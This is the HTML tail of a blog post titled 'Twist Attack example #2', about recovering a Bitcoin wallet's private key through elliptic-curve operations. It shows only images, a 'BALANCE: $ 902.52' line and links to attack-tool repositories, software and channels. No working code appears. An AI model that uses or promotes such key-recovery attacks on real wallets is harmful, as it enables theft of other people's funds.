<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-11-1024x521.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2350"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-12-1024x182.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2352"></figure></div>


<p><code><strong>BALANCE: $ 902.52</strong></code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/18TwistAttack" target="_blank" rel="noreferrer noopener">Source</a></strong></p>



<p><strong><a href="https://attacksafe.ru/software" target="_blank" rel="noreferrer noopener">ATTACKSAFE SOFTWARE</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram: https://t.me/cryptodeeptech</a></strong></p>



<p><strong><a href="https://youtu.be/pOviZOYItv4" target="_blank" rel="noreferrer noopener">Video: https://youtu.be/pOviZOYItv4</a></strong></p>



<p><strong><a href="https://cryptodeeptech.ru/twist-attack-2" target="_blank" rel="noreferrer noopener">Source: https://cryptodeeptech.ru/twist-attack-2</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example - 2 continue a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/034-1-1024x576.png" alt="Twist Attack example #2 continue a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2359"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">
	</div><!-- .entry-content -->


